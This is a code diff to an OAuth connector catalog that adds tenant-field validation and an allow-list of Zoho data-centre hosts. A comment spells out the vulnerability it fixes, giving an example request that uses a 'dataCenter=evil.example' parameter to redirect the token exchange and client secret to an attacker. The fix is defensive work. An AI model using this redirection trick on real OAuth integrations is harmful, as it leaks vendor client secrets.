@@ -70,6 +70,19 @@ export interface OAuthTenantField {
   label: string
   placeholder?: string
   help?: string
+  /**
+   * REQUIRED whenever `tenantFieldPosition(oauth)` says `'host'` for this field (enforced by
+   * `catalog.test.ts`'s "every host-positioned tenant field has allowedValues" test, which walks the
+   * whole catalog). Security incident, not a style rule: `catalog.ts` templates a tenant field straight
+   * into a URL's authority component for a reason (Zoho's `dataCenter` picks which of its seven regional
+   * hosts to hit), but with no constraint on the value, `GET /v1/admin/connectors/zoho/oauth/start?
+   * dataCenter=evil.example` makes the Worker's own callback exchange the authorization code - and send
+   * `OAUTH_ZOHO_CLIENT_SECRET` - to `evil.example`, not Zoho, over a link that only needs an
+   * already-authenticated admin to click it (the route itself is `auth: 'admin'`; the attacker never
+   * needs a session, only a click). `allowedValues` closes it by construction: `routes/connectors-oauth.
+   * ts`'s `/oauth/start` rejects any value outside this exact list with 400 before minting any state.
+   */
+  allowedValues?: readonly string[]
 }
 
 /**
@@ -96,23 +109,125 @@ export interface OAuthTenantField {
  * no-drawer connect flow for these five kinds is out of this task's scope (only `GET .../oauth/start` and
  * `GET .../oauth/callback`, both auth-code-only, were asked for) - see the report's open question.
  */
-export interface OAuthConfig {
-  flow: 'auth-code' | 'client-credentials'
-  /** `auth-code` only. Templated the same way `RestProbeSpec.url` is against `config` (percent-encoded,
-   *  except `{baseUrl}` if ever used). */
-  authorizeUrl?: string
-  /** Templated against `config` the same way. */
-  tokenUrl: string
+interface OAuthConfigBase {
   /** Templated against `config`; each entry may contain `{placeholder}`s (Dynamics 365's scope embeds
    *  the org's own Dataverse URL). Joined with a space for the request. */
   scopes: string[]
-  /** `auth-code` only: does the vendor support PKCE (RFC 7636)? Sent whenever true; `oauth.ts` never
-   *  sends `code_challenge` for a kind where this is false, since an unexpected parameter is occasionally
-   *  rejected outright by a stricter authorization server. */
-  pkce: boolean
   tenantField?: OAuthTenantField
   clientIdEnv: string
   clientSecretEnv: string
+}
+
+/** The 3-legged browser flow `routes/connectors-oauth.ts` drives end to end (`GET .../oauth/start` ->
+ *  vendor consent -> `GET .../oauth/callback`). `authorizeUrl` is required by the type, not just
+ *  convention, so a kind cannot be marked `auth-code` without one - the earlier optional-field version of
+ *  this type let that slip through unnoticed. */
+export interface OAuthAuthCodeConfig extends OAuthConfigBase {
+  flow: 'auth-code'
+  /** Templated the same way `RestProbeSpec.url` is against `config` (percent-encoded, except `{baseUrl}`
+   *  if ever used). */
+  authorizeUrl: string
+  tokenUrl: string
+  /** Does the vendor support PKCE (RFC 7636)? Sent whenever true; `oauth.ts` never sends
+   *  `code_challenge` for a kind where this is false, since an unexpected parameter is occasionally
+   *  rejected outright by a stricter authorization server. */
+  pkce: boolean
+}
+
+/** The 2-legged, no-browser grant. No `authorizeUrl` and no PKCE exist for this type at all (RFC 6749 4.4
+ *  has no user, no redirect) - the drawer collects the vendor tenant/org fields and the per-connection
+ *  client secret exactly as any other static-credential kind (`ConnectorCatalogEntry.fields`, not this
+ *  config), and `oauth.ts`'s `refreshOAuthToken` re-runs the same grant to mint a fresh token rather than
+ *  using a `refresh_token` (client-credentials never issues one). */
+export interface OAuthClientCredentialsConfig extends OAuthConfigBase {
+  flow: 'client-credentials'
+  tokenUrl: string
+}
+
+/**
+ * Per-kind OAuth 2.0 config (task: "generic OAuth 2.0 authorization-code flow").
+ *
+ * `clientIdEnv`/`clientSecretEnv` are always `OAUTH_<KIND>_CLIENT_ID` / `OAUTH_<KIND>_CLIENT_SECRET`
+ * Worker secrets - the Operator's own single app registration with that vendor (the same shape the
+ * existing `CF_OAUTH_CLIENT_ID`/`CF_OAUTH_CLIENT_SECRET` pair already uses for the Cloudflare connect
+ * flow). For an `auth-code` kind this is the one OAuth client every consent screen and token exchange
+ * uses. For a `client-credentials` kind, binding these two flips `oauthConfigured`/`availability` at the
+ * catalog level (task item 5); today's per-connection drawer flow (already existing before this task,
+ * now vault-encrypting the secret instead of storing it in plaintext `config_json` - see `fields` below)
+ * is the actual way a specific tenant gets connected, since each Salesforce org / Azure AD tenant
+ * typically has its own app registration rather than sharing the Operator's. Wiring a shared-app,
+ * no-drawer connect flow for these five kinds is out of this task's scope (only `GET .../oauth/start` and
+ * `GET .../oauth/callback`, both auth-code-only, were asked for) - see the report's open question.
+ */
+export type OAuthConfig = OAuthAuthCodeConfig | OAuthClientCredentialsConfig
+
+/** Where `{key}` sits inside one URL template: `host` when it appears before the first single slash that
+ *  follows the scheme - or, for a template with no literal scheme at all (Salesforce's `tokenUrl` is
+ *  `'{instanceUrl}/services/oauth2/token'`; the admin-supplied value is expected to carry its own
+ *  `https://`), before the first slash in the whole template, since the placeholder is then standing in
+ *  for the entire origin. `path` otherwise. `none` when the placeholder is not in this template. */
+function placeholderPosition(template: string, key: string): 'host' | 'path' | 'none' {
+  const placeholder = `{${key}}`
+  const idx = template.indexOf(placeholder)
+  if (idx === -1) return 'none'
+  const schemeMatch = /^https?:\/\//i.exec(template)
+  const authorityStart = schemeMatch ? schemeMatch[0].length : 0
+  const nextSlash = template.indexOf('/', authorityStart)
+  const hostRegionEnd = nextSlash === -1 ? template.length : nextSlash
+  return idx < hostRegionEnd ? 'host' : 'path'
+}
+
+/**
+ * The most dangerous position `oauth.tenantField` occupies across every URL template it is substituted
+ * into - `host` if it is host-positioned in *either* `authorizeUrl` or `tokenUrl`, else `path` if it
+ * appears only in a path position, else `none`. Scoped to the templates this kind's own flow actually
+ * uses (`authorizeUrl` does not exist on a `client-credentials` config at all, so only `tokenUrl` is
+ * checked there) - see `catalog.test.ts` for the walk-the-whole-catalog test this feeds.
+ */
+export function tenantFieldPosition(oauth: OAuthConfig): 'host' | 'path' | 'none' {
+  if (!oauth.tenantField) return 'none'
+  const key = oauth.tenantField.key
+  const templates = oauth.flow === 'auth-code' ? [oauth.authorizeUrl, oauth.tokenUrl] : [oauth.tokenUrl]
+  let sawPath = false
+  for (const template of templates) {
+    const position = placeholderPosition(template, key)
+    if (position === 'host') return 'host'
+    if (position === 'path') sawPath = true
+  }
+  return sawPath ? 'path' : 'none'
+}
+
+const TENANT_PATH_SHAPE_RE = /^[A-Za-z0-9-]{1,255}$/
+
+export interface TenantValueCheck {
+  ok: boolean
+  error?: string
+}
+
+/**
+ * Validates a tenant value against this kind's declared constraint before it is ever templated into a
+ * request: `allowedValues` for a host-positioned field (the CRITICAL fix - an unconstrained value there
+ * redirects the token exchange, client secret included, to whatever host the caller names), or a
+ * GUID-or-single-DNS-label shape for a path-only one (the Microsoft Entra tenant id: letters, digits,
+ * hyphens only - no dots, no slashes, no percent signs, so it can never smuggle a second path segment or
+ * a scheme change into the URL it is substituted into). A field with no declared position (`none`)
+ * always passes - no current catalog entry has a `tenantField` that is not templated into a URL, but a
+ * future one that only stored the value for display would have no reason to fail here either.
+ */
+export function validateTenantValue(oauth: OAuthConfig, value: string): TenantValueCheck {
+  if (!oauth.tenantField) return { ok: true }
+  const position = tenantFieldPosition(oauth)
+  if (position === 'host') {
+    const allowed = oauth.tenantField.allowedValues
+    if (!allowed?.length) return { ok: false, error: 'this connector has no allowed value list configured' }
+    return allowed.includes(value) ? { ok: true } : { ok: false, error: `must be one of: ${allowed.join(', ')}` }
+  }
+  if (position === 'path') {
+    return TENANT_PATH_SHAPE_RE.test(value)
+      ? { ok: true }
+      : { ok: false, error: 'must be a tenant id: letters, digits, and hyphens only - no dots, slashes, or percent signs' }
+  }
+  return { ok: true }
 }
 
 export interface ConnectorCatalogEntry extends ConnectorCatalogCore {
@@ -186,7 +301,6 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
         flow: 'client-credentials',
         tokenUrl: '{instanceUrl}/services/oauth2/token',
         scopes: ['api'],
-        pkce: false,
         tenantField: { key: 'instanceUrl', label: 'My Domain URL', placeholder: 'https://yourorg.my.salesforce.com' },
         clientIdEnv: 'OAUTH_SALESFORCE_CLIENT_ID',
         clientSecretEnv: 'OAUTH_SALESFORCE_CLIENT_SECRET'
@@ -232,7 +346,25 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
         tokenUrl: 'https://{dataCenter}/oauth/v2/token',
         scopes: ['ZohoCRM.modules.ALL', 'ZohoCRM.settings.ALL'],
         pkce: false,
-        tenantField: { key: 'dataCenter', label: 'Data centre', placeholder: 'accounts.zoho.com' },
+        tenantField: {
+          key: 'dataCenter',
+          label: 'Data centre',
+          placeholder: 'accounts.zoho.com',
+          // CRITICAL fix: dataCenter is host-positioned in both authorizeUrl and tokenUrl above, so an
+          // unconstrained value here would let /oauth/start's ?dataCenter= query param redirect the
+          // token exchange - OAUTH_ZOHO_CLIENT_SECRET included - to an attacker's host. These seven are
+          // Zoho's complete, documented set (zoho.com/crm/developer/docs/api/v6/multi-dc.html, checked
+          // 2026-09-06); routes/connectors-oauth.ts rejects anything else with 400 before minting state.
+          allowedValues: [
+            'accounts.zoho.com',
+            'accounts.zoho.eu',
+            'accounts.zoho.in',
+            'accounts.zoho.com.au',
+            'accounts.zoho.jp',
+            'accounts.zoho.com.cn',
+            'accounts.zohocloud.ca'
+          ]
+        },
         clientIdEnv: 'OAUTH_ZOHO_CLIENT_ID',
         clientSecretEnv: 'OAUTH_ZOHO_CLIENT_SECRET'
       }
@@ -241,7 +373,7 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
   dynamics365: entry(
     'dynamics365',
     [
-      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: 'yourorg.onmicrosoft.com or a tenant GUID', required: true },
+      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
       { key: 'instanceUrl', label: 'Organization URL', type: 'url', placeholder: 'https://yourorg.crm.dynamics.com', required: true },
       { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
       CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
@@ -254,7 +386,6 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
         flow: 'client-credentials',
         tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
         scopes: ['{instanceUrl}/.default'],
-        pkce: false,
         tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
         clientIdEnv: 'OAUTH_DYNAMICS365_CLIENT_ID',
         clientSecretEnv: 'OAUTH_DYNAMICS365_CLIENT_SECRET'
@@ -499,7 +630,7 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
   sharepoint: entry(
     'sharepoint',
     [
-      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: 'yourorg.onmicrosoft.com or a tenant GUID', required: true },
+      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
       { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
       CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
     ],
@@ -513,7 +644,6 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
         flow: 'client-credentials',
         tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
         scopes: ['https://graph.microsoft.com/.default'],
-        pkce: false,
         tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
         clientIdEnv: 'OAUTH_SHAREPOINT_CLIENT_ID',
         clientSecretEnv: 'OAUTH_SHAREPOINT_CLIENT_SECRET'
@@ -594,7 +724,7 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
   microsoftteams: entry(
     'microsoftteams',
     [
-      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: 'yourorg.onmicrosoft.com or a tenant GUID', required: true },
+      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
       { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
       CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
     ],
@@ -606,7 +736,6 @@ export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
         flow: 'client-credentials',
         tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
         scopes: ['https://graph.microsoft.com/.default'],
-        pkce: false,
         tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
         clientIdEnv: 'OAUTH_MICROSOFTTEAMS_CLIENT_ID',
         clientSecretEnv: 'OAUTH_MICROSOFTTEAMS_CLIENT_SECRET'
